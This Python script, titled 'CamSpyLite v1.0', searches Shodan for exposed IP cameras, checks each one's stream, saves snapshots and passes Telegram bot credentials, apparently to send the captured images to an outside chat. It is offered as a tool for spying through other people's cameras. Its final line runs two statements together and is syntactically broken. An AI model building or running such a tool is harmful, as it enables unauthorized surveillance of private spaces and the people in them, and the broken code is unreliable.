from core.scan import shodan_search
from core.stream_checker import check_and_capture
import os, time

# === CONFIG ===
SHODAN_API_KEY = "YOUR_SHODAN_API_KEY"
TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID"
SAVE_DIR = "snapshots"

os.makedirs(SAVE_DIR, exist_ok=True)

print("\n===== CamSpyLite v1.0 =====")
targets = shodan_search(SHODAN_API_KEY)
print(f"[+] Found {len(targets)} potential targets\n")

for ip in targets:
    print(f"[*] Checking {ip}...")
    check_and_capture(ip, SAVE_DIR, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID)            time.sleep(2)
